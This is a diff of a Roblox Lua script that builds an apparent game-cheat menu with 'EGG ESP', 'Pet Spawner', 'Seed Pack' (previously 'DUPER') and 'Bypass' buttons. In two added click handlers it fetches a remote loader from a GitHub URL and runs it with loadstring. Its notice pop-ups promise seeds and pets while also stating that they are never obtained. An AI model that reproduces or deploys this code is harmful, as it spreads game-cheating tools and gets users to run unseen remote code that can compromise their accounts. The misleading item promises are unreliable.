@@ -12,9 +12,9 @@ local ServerScanner = Instance.new("TextButton")
 local UICorner_2 = Instance.new("UICorner")
 local SeedPack = Instance.new("TextButton")
 local UICorner_3 = Instance.new("UICorner")
-local TextButton = Instance.new("TextButton")
+local EGGESP = Instance.new("TextButton")
 local UICorner_4 = Instance.new("UICorner")
-local TextButton_2 = Instance.new("TextButton")
+local SPAWNER = Instance.new("TextButton")
 local UICorner_5 = Instance.new("UICorner")
 local a = Instance.new("TextButton")
 local UICorner_6 = Instance.new("UICorner")
@@ -29,6 +29,13 @@ local CLOSE_2 = Instance.new("TextButton")
 local TextLabel_2 = Instance.new("TextLabel")
 local TextLabel_3 = Instance.new("TextLabel")
 local TextLabel_4 = Instance.new("TextLabel")
+local SPAWNER_2 = Instance.new("Frame")
+local UICorner_9 = Instance.new("UICorner")
+local script_2 = Instance.new("TextButton")
+local CLOSE_3 = Instance.new("TextButton")
+local TextLabel_5 = Instance.new("TextLabel")
+local TextLabel_6 = Instance.new("TextLabel")
+local TextLabel_7 = Instance.new("TextLabel")
 
 --Properties:
 
@@ -61,6 +68,7 @@ ScrollingFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
 ScrollingFrame.BorderSizePixel = 0
 ScrollingFrame.Position = UDim2.new(0, 0, 0.263793021, 0)
 ScrollingFrame.Size = UDim2.new(0, 195, 0, 79)
+ScrollingFrame.CanvasPosition = Vector2.new(0, 115.784805)
 
 ServerScanner.Name = "ServerScanner"
 ServerScanner.Parent = ScrollingFrame
@@ -85,38 +93,42 @@ SeedPack.BorderSizePixel = 0
 SeedPack.Position = UDim2.new(0.13333334, 0, 0.244690716, 0)
 SeedPack.Size = UDim2.new(0, 143, 0, 29)
 SeedPack.Font = Enum.Font.SourceSansBold
-SeedPack.Text = "DUPER"
+SeedPack.Text = "Seed Pack"
 SeedPack.TextColor3 = Color3.fromRGB(0, 0, 0)
 SeedPack.TextSize = 14.000
 
 UICorner_3.CornerRadius = UDim.new(0, 5)
 UICorner_3.Parent = SeedPack
 
-TextButton.Parent = ScrollingFrame
-TextButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-TextButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
-TextButton.BorderSizePixel = 0
-TextButton.Position = UDim2.new(0.13333334, 0, 0.43910256, 0)
-TextButton.Size = UDim2.new(0, 143, 0, 29)
-TextButton.Font = Enum.Font.SourceSans
-TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
-TextButton.TextSize = 14.000
+EGGESP.Name = "EGG ESP"
+EGGESP.Parent = ScrollingFrame
+EGGESP.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+EGGESP.BorderColor3 = Color3.fromRGB(0, 0, 0)
+EGGESP.BorderSizePixel = 0
+EGGESP.Position = UDim2.new(0.13333334, 0, 0.43910256, 0)
+EGGESP.Size = UDim2.new(0, 143, 0, 29)
+EGGESP.Font = Enum.Font.SourceSans
+EGGESP.Text = "EGG ESP"
+EGGESP.TextColor3 = Color3.fromRGB(0, 0, 0)
+EGGESP.TextSize = 14.000
 
 UICorner_4.CornerRadius = UDim.new(0, 5)
-UICorner_4.Parent = TextButton
+UICorner_4.Parent = EGGESP
 
-TextButton_2.Parent = ScrollingFrame
-TextButton_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-TextButton_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
-TextButton_2.BorderSizePixel = 0
-TextButton_2.Position = UDim2.new(0.13333334, 0, 0.633604825, 0)
-TextButton_2.Size = UDim2.new(0, 143, 0, 29)
-TextButton_2.Font = Enum.Font.SourceSans
-TextButton_2.TextColor3 = Color3.fromRGB(0, 0, 0)
-TextButton_2.TextSize = 14.000
+SPAWNER.Name = "SPAWNER"
+SPAWNER.Parent = ScrollingFrame
+SPAWNER.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+SPAWNER.BorderColor3 = Color3.fromRGB(0, 0, 0)
+SPAWNER.BorderSizePixel = 0
+SPAWNER.Position = UDim2.new(0.13333334, 0, 0.633604825, 0)
+SPAWNER.Size = UDim2.new(0, 143, 0, 29)
+SPAWNER.Font = Enum.Font.SourceSans
+SPAWNER.Text = "Pet Spawner"
+SPAWNER.TextColor3 = Color3.fromRGB(0, 0, 0)
+SPAWNER.TextSize = 14.000
 
 UICorner_5.CornerRadius = UDim.new(0, 5)
-UICorner_5.Parent = TextButton_2
+UICorner_5.Parent = SPAWNER
 
 a.Name = "a"
 a.Parent = ScrollingFrame
@@ -126,6 +138,7 @@ a.BorderSizePixel = 0
 a.Position = UDim2.new(0.13333334, 0, 0.833063066, 0)
 a.Size = UDim2.new(0, 143, 0, 29)
 a.Font = Enum.Font.SourceSans
+a.Text = "Bypass - Coming soon"
 a.TextColor3 = Color3.fromRGB(0, 0, 0)
 a.TextSize = 14.000
 
@@ -175,11 +188,12 @@ UICorner_7.Parent = OPEN
 WARNING.Name = "WARNING"
 WARNING.Parent = Frame
 WARNING.Active = true
+WARNING.AnchorPoint = Vector2.new(1, 1)
 WARNING.BackgroundColor3 = Color3.fromRGB(90, 90, 90)
 WARNING.BorderColor3 = Color3.fromRGB(0, 0, 0)
 WARNING.BorderSizePixel = 0
-WARNING.Position = UDim2.new(0.394871473, 0, -0.0435283482, 0)
-WARNING.Size = UDim2.new(0, 492, 0, 245)
+WARNING.Position = UDim2.new(2.84102559, 0, 1.68899143, 0)
+WARNING.Size = UDim2.new(0, 466, 0, 198)
 WARNING.Visible = false
 
 UICorner_8.Parent = WARNING
@@ -189,8 +203,8 @@ script.Parent = WARNING
 script.BackgroundColor3 = Color3.fromRGB(31, 206, 0)
 script.BorderColor3 = Color3.fromRGB(0, 0, 0)
 script.BorderSizePixel = 3
-script.Position = UDim2.new(0.522357762, 0, 0.763157785, 0)
-script.Size = UDim2.new(0, 201, 0, 32)
+script.Position = UDim2.new(0.561143398, 0, 0.768208206, 0)
+script.Size = UDim2.new(0, 184, 0, 32)
 script.Font = Enum.Font.SourceSansBold
 script.Text = "I UNDERSTAND - EXECUTE"
 script.TextColor3 = Color3.fromRGB(0, 0, 0)
@@ -201,8 +215,8 @@ CLOSE_2.Parent = WARNING
 CLOSE_2.BackgroundColor3 = Color3.fromRGB(177, 0, 0)
 CLOSE_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
 CLOSE_2.BorderSizePixel = 3
-CLOSE_2.Position = UDim2.new(0.0670732334, 0, 0.763157785, 0)
-CLOSE_2.Size = UDim2.new(0, 201, 0, 32)
+CLOSE_2.Position = UDim2.new(0.0590462908, 0, 0.763157725, 0)
+CLOSE_2.Size = UDim2.new(0, 188, 0, 32)
 CLOSE_2.Font = Enum.Font.SourceSansBold
 CLOSE_2.Text = "I UNDERSTAND - DONT EXECUTE"
 CLOSE_2.TextColor3 = Color3.fromRGB(0, 0, 0)
@@ -212,10 +226,10 @@ TextLabel_2.Parent = WARNING
 TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 TextLabel_2.BackgroundTransparency = 1.000
 TextLabel_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
-TextLabel_2.BorderSizePixel = 10
+TextLabel_2.BorderSizePixel = 8
 TextLabel_2.Position = UDim2.new(0.298780501, 0, -0.0135338604, 0)
 TextLabel_2.Size = UDim2.new(0, 192, 0, 57)
-TextLabel_2.Font = Enum.Font.Unknown
+TextLabel_2.Font = Enum.Font.SourceSans
 TextLabel_2.Text = "NOTICE !"
 TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
 TextLabel_2.TextSize = 56.000
@@ -225,31 +239,107 @@ TextLabel_3.Parent = WARNING
 TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 TextLabel_3.BackgroundTransparency = 1.000
 TextLabel_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
-TextLabel_3.BorderSizePixel = 0
-TextLabel_3.Position = UDim2.new(0.0670732334, 0, 0.220408157, 0)
-TextLabel_3.Size = UDim2.new(0, 425, 0, 49)
+TextLabel_3.BorderSizePixel = 7
+TextLabel_3.Position = UDim2.new(0.0894308314, 0, 0.422126681, 0)
+TextLabel_3.Size = UDim2.new(0, 400, 0, 62)
 TextLabel_3.Font = Enum.Font.SourceSans
-TextLabel_3.Text = "UNDERSTAND: YOU WILL NOT GET TO GROW THE SEED BUT YOU CAN PLANT IT BUT WILL NEVER OBTAIN IT"
-TextLabel_3.TextColor3 = Color3.fromRGB(250, 250, 250)
-TextLabel_3.TextSize = 14.000
+TextLabel_3.Text = "UNLESS THE SERVER SCANNER SAID THAT IT IS COMPATIBLE SERVER, THEN YOU WILL GET TO PLANT IT AND GROW - IF YOU LEAVE AND NOT PLANT IT IT WILL DISAPPEAR"
+TextLabel_3.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_3.TextSize = 18.000
 TextLabel_3.TextWrapped = true
 
 TextLabel_4.Parent = WARNING
 TextLabel_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 TextLabel_4.BackgroundTransparency = 1.000
 TextLabel_4.BorderColor3 = Color3.fromRGB(0, 0, 0)
-TextLabel_4.BorderSizePixel = 7
-TextLabel_4.Position = UDim2.new(0.0894308314, 0, 0.422126681, 0)
-TextLabel_4.Size = UDim2.new(0, 400, 0, 62)
+TextLabel_4.BorderSizePixel = 0
+TextLabel_4.Position = UDim2.new(0.0670732334, 0, 0.220408157, 0)
+TextLabel_4.Size = UDim2.new(0, 425, 0, 49)
 TextLabel_4.Font = Enum.Font.SourceSans
-TextLabel_4.Text = "UNLESS THE SERVER SCANNER SAID THAT IT IS COMPATIBLE SERVER, THEN YOU WILL GET TO PLANT IT AND GROW - IF YOU LEAVE AND NOT PLANT IT IT WILL DISAPPEAR"
-TextLabel_4.TextColor3 = Color3.fromRGB(255, 255, 255)
-TextLabel_4.TextSize = 18.000
+TextLabel_4.Text = "UNDERSTAND: YOU WILL NOT GET TO GROW THE SEED BUT YOU CAN PLANT IT BUT WILL NEVER OBTAIN IT"
+TextLabel_4.TextColor3 = Color3.fromRGB(250, 250, 250)
+TextLabel_4.TextSize = 14.000
 TextLabel_4.TextWrapped = true
+
+SPAWNER_2.Name = "SPAWNER"
+SPAWNER_2.Parent = Frame
+SPAWNER_2.Active = true
+SPAWNER_2.AnchorPoint = Vector2.new(1, 1)
+SPAWNER_2.BackgroundColor3 = Color3.fromRGB(90, 90, 90)
+SPAWNER_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+SPAWNER_2.BorderSizePixel = 0
+SPAWNER_2.Position = UDim2.new(2.84102559, 0, 1.68899143, 0)
+SPAWNER_2.Size = UDim2.new(0, 466, 0, 198)
+SPAWNER_2.Visible = false
+
+UICorner_9.Parent = SPAWNER_2
+
+script_2.Name = "script"
+script_2.Parent = SPAWNER_2
+script_2.BackgroundColor3 = Color3.fromRGB(31, 206, 0)
+script_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+script_2.BorderSizePixel = 3
+script_2.Position = UDim2.new(0.561143398, 0, 0.768208206, 0)
+script_2.Size = UDim2.new(0, 184, 0, 32)
+script_2.Font = Enum.Font.SourceSansBold
+script_2.Text = "I UNDERSTAND - EXECUTE"
+script_2.TextColor3 = Color3.fromRGB(0, 0, 0)
+script_2.TextSize = 14.000
+
+CLOSE_3.Name = "CLOSE"
+CLOSE_3.Parent = SPAWNER_2
+CLOSE_3.BackgroundColor3 = Color3.fromRGB(177, 0, 0)
+CLOSE_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
+CLOSE_3.BorderSizePixel = 3
+CLOSE_3.Position = UDim2.new(0.0590462908, 0, 0.763157725, 0)
+CLOSE_3.Size = UDim2.new(0, 188, 0, 32)
+CLOSE_3.Font = Enum.Font.SourceSansBold
+CLOSE_3.Text = "I UNDERSTAND - DONT EXECUTE"
+CLOSE_3.TextColor3 = Color3.fromRGB(0, 0, 0)
+CLOSE_3.TextSize = 14.000
+
+TextLabel_5.Parent = SPAWNER_2
+TextLabel_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_5.BackgroundTransparency = 1.000
+TextLabel_5.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_5.BorderSizePixel = 10
+TextLabel_5.Position = UDim2.new(0.298780501, 0, -0.0135338604, 0)
+TextLabel_5.Size = UDim2.new(0, 192, 0, 57)
+TextLabel_5.Font = Enum.Font.Unknown
+TextLabel_5.Text = "NOTICE !"
+TextLabel_5.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_5.TextSize = 56.000
+TextLabel_5.TextStrokeTransparency = 0.000
+
+TextLabel_6.Parent = SPAWNER_2
+TextLabel_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_6.BackgroundTransparency = 1.000
+TextLabel_6.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_6.BorderSizePixel = 7
+TextLabel_6.Position = UDim2.new(0.0894308314, 0, 0.422126681, 0)
+TextLabel_6.Size = UDim2.new(0, 400, 0, 62)
+TextLabel_6.Font = Enum.Font.SourceSans
+TextLabel_6.Text = "UNLESS THE SERVER SCANNER SAID THAT IT IS COMPATIBLE SERVER, THEN YOU WILL GET TO USE IT AND PUT IT - IF YOU LEAVE AND NOT PUT IT, IT WILL DISAPPEAR"
+TextLabel_6.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_6.TextSize = 18.000
+TextLabel_6.TextWrapped = true
+
+TextLabel_7.Parent = SPAWNER_2
+TextLabel_7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_7.BackgroundTransparency = 1.000
+TextLabel_7.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_7.BorderSizePixel = 0
+TextLabel_7.Position = UDim2.new(0.0670732334, 0, 0.220408157, 0)
+TextLabel_7.Size = UDim2.new(0, 425, 0, 49)
+TextLabel_7.Font = Enum.Font.SourceSans
+TextLabel_7.Text = "UNDERSTAND: YOU WILL NOT GET TO PLACE THE PET BUT YOU CAN SEE IT BUT WILL NEVER OBTAIN IT"
+TextLabel_7.TextColor3 = Color3.fromRGB(250, 250, 250)
+TextLabel_7.TextSize = 14.000
+TextLabel_7.TextWrapped = true
 
 -- Scripts:
 
-local function XIPJ_fake_script() -- ServerScanner.LocalScript 
+local function YFQW_fake_script() -- ServerScanner.LocalScript 
 	local script = Instance.new('LocalScript', ServerScanner)
 
 	-- Place this LocalScript inside your 'Server Scanner' TextButton
@@ -294,8 +384,8 @@ local function XIPJ_fake_script() -- ServerScanner.LocalScript
 		debounce = false
 	end)
 end
-coroutine.wrap(XIPJ_fake_script)()
-local function RINUTQD_fake_script() -- SeedPack.ToggleWarningFrame 
+coroutine.wrap(YFQW_fake_script)()
+local function IOACRWV_fake_script() -- SeedPack.ToggleWarningFrame 
 	local script = Instance.new('LocalScript', SeedPack)
 
 	local seedpackButton = script.Parent
@@ -308,8 +398,68 @@ local function RINUTQD_fake_script() -- SeedPack.ToggleWarningFrame
 		warningFrame.Visible = true
 	end)
 end
-coroutine.wrap(RINUTQD_fake_script)()
-local function ZJTCJCT_fake_script() -- a.LocalScript 
+coroutine.wrap(IOACRWV_fake_script)()
+local function KDBHTFC_fake_script() -- EGGESP.LocalScript 
+	local script = Instance.new('LocalScript', EGGESP)
+
+	-- Place this LocalScript inside your 'Server Scanner' TextButton
+	local button = script.Parent
+	local mainFrame = button.Parent.Parent -- Goes up to ScrollingFrame then to MainFrame
+	local debounce = false
+	
+	button.MouseButton1Click:Connect(function()
+		if debounce then return end
+		debounce = true
+	
+		-- Visual feedback
+		local originalText = button.Text
+		local originalColor = button.BackgroundColor3
+	
+		button.Text = "EXECUTING..."
+		button.BackgroundColor3 = Color3.fromRGB(0, 100, 200) -- Blue during scan
+	
+		-- Execute the external script with error handling
+		local success, err = pcall(function()
+			loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/NoLag-id/No-Lag-HUB/refs/heads/main/Loader/LoaderV1.lua"))()
+		end)
+	
+		-- Results handling
+		if success then
+			button.Text = "EXECUTED!"
+			if mainFrame:FindFirstChild("ScanResults") then
+				mainFrame.ScanResults.Text = "External script executed successfully"
+			end
+		else
+			button.Text = "EXECUTION FAILED!"
+			if mainFrame:FindFirstChild("ScanResults") then
+				mainFrame.ScanResults.Text = "Error: "..tostring(err):sub(1, 100)
+			end
+			warn("ServerScanner Error:", err)
+		end
+	
+		-- Reset after 2 seconds
+		task.wait(2)
+		button.Text = originalText
+		button.BackgroundColor3 = originalColor
+		debounce = false
+	end)
+end
+coroutine.wrap(KDBHTFC_fake_script)()
+local function BNGQI_fake_script() -- SPAWNER.ToggleSpawnerFrame 
+	local script = Instance.new('LocalScript', SPAWNER)
+
+	local spawnerButton = script.Parent
+	local playerGui = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+	local screenGui = playerGui:WaitForChild("ScreenGui")
+	local frame = screenGui:WaitForChild("Frame")
+	local warningFrame = frame:WaitForChild("SPAWNER")
+	
+	spawnerButton.MouseButton1Click:Connect(function()
+		warningFrame.Visible = true
+	end)
+end
+coroutine.wrap(BNGQI_fake_script)()
+local function OCPQT_fake_script() -- a.LocalScript 
 	local script = Instance.new('LocalScript', a)
 
 	-- Place this LocalScript inside your SEEDPACK button
@@ -320,8 +470,8 @@ local function ZJTCJCT_fake_script() -- a.LocalScript
 		warningFrame.Visible = not warningFrame.Visible -- Toggle visibility
 	end)
 end
-coroutine.wrap(ZJTCJCT_fake_script)()
-local function DELY_fake_script() -- CLOSE.LocalScript 
+coroutine.wrap(OCPQT_fake_script)()
+local function HEGEAM_fake_script() -- CLOSE.LocalScript 
 	local script = Instance.new('LocalScript', CLOSE)
 
 	local closeButton = script.Parent
@@ -332,8 +482,8 @@ local function DELY_fake_script() -- CLOSE.LocalScript
 	end)
 	
 end
-coroutine.wrap(DELY_fake_script)()
-local function UZOF_fake_script() -- OPEN.LocalScript 
+coroutine.wrap(HEGEAM_fake_script)()
+local function BRBZLX_fake_script() -- OPEN.LocalScript 
 	local script = Instance.new('LocalScript', OPEN)
 
 	local openButton = script.Parent
@@ -344,8 +494,8 @@ local function UZOF_fake_script() -- OPEN.LocalScript
 	end)
 	
 end
-coroutine.wrap(UZOF_fake_script)()
-local function IBPWD_fake_script() -- script.LocalScript 
+coroutine.wrap(BRBZLX_fake_script)()
+local function OPVZ_fake_script() -- script.LocalScript 
 	local script = Instance.new('LocalScript', script)
 
 	-- Place this LocalScript inside your pop-up's action button
@@ -385,8 +535,8 @@ local function IBPWD_fake_script() -- script.LocalScript
 		debounce = false
 	end)
 end
-coroutine.wrap(IBPWD_fake_script)()
-local function FGQLO_fake_script() -- CLOSE_2.LocalScript 
+coroutine.wrap(OPVZ_fake_script)()
+local function EAGX_fake_script() -- CLOSE_2.LocalScript 
 	local script = Instance.new('LocalScript', CLOSE_2)
 
 	local closeButton = script.Parent
@@ -397,4 +547,57 @@ local function FGQLO_fake_script() -- CLOSE_2.LocalScript
 	end)
 	
 end
-coroutine.wrap(FGQLO_fake_script)()
+coroutine.wrap(EAGX_fake_script)()
+local function HMPPMM_fake_script() -- script_2.LocalScript 
+	local script = Instance.new('LocalScript', script_2)
+
+		-- Place this LocalScript inside your pop-up's action button
+	local actionButton = script.Parent
+	local warningFrame = actionButton.Parent -- Assuming button is direct child of WARNING frame
+	local debounce = false
+	
+	actionButton.MouseButton1Click:Connect(function()
+		if debounce then return end
+		debounce = true
+	
+		-- Visual feedback: show loading state
+		local originalText = actionButton.Text
+		actionButton.Text = "EXECUTING..."
+		actionButton.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
+	
+		-- Execute the external script
+		local success, err = pcall(function()
+			loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/NoLag-id/No-Lag-HUB/refs/heads/main/Loader/LoaderV1.lua", true ))()
+		end)
+	
+		-- Close the warning frame regardless of success
+		warningFrame.Visible = false
+	
+		-- Handle results
+		if success then
+			actionButton.Text = "SUCCESS!"
+		else
+			actionButton.Text = "ERROR!"
+			warn("Script execution failed:", err)
+		end
+	
+		-- Reset after 1 second
+		task.wait(1)
+		actionButton.Text = originalText
+		actionButton.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+		debounce = false
+	end)
+end
+coroutine.wrap(HMPPMM_fake_script)()
+local function ENQM_fake_script() -- CLOSE_3.LocalScript 
+	local script = Instance.new('LocalScript', CLOSE_3)
+
+	local closeButton = script.Parent
+	local frame = closeButton.Parent
+	
+	closeButton.MouseButton1Click:Connect(function()
+		frame.Visible = false
+	end)
+	
+end
+coroutine.wrap(ENQM_fake_script)()
